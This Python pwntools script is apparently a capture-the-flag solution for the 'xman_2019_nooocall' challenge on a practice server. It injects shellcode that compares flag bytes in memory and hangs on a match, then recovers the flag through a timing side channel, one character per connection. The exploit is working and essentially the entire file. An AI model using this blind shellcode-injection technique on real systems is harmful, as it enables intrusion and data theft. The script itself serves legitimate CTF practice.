# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './xman_2019_nooocall'
os.system('chmod +x %s'%binary)
context.binary = binary
# context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = 'node4.buuoj.cn'
    port = '29870'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

allString = '{f1234567890qwertyuiopasdghjklzxcvbnm}-'

# allString = 'flag'

def attack( idx , ch ):
    
    ru('Shellcode >>')

    shellcode = '''
    mov rax , [rsp+0x18]
    mov cl , byte ptr [rax+{0}]
    cmp cl , {1}
    jz $-3
    '''.format(idx , ch)

    # dbg()
    se(asm(shellcode))

    # p.interactive()

# attack(0,ord('f'))

flag = ''

print(len('flag{a0348b2f-2d10-44a6-afc0-39b86170289a}'))

for idx in range(0x30):
    for ch in allString:
        # p = process(binary)
        p = remote(host,port)
        attack(idx,ord(ch))

        start = time.time()
        p.recv( '1', timeout = 1)
        end = time.time()

        if (end - start) > 1:
            flag += ch
            p.close()
            print(flag , len(flag))
            break

        p.close()




'''
@File    :   xman_2019_nooocall.py
@Time    :   2022/02/06 13:58:13
@Author  :   Niyah 
'''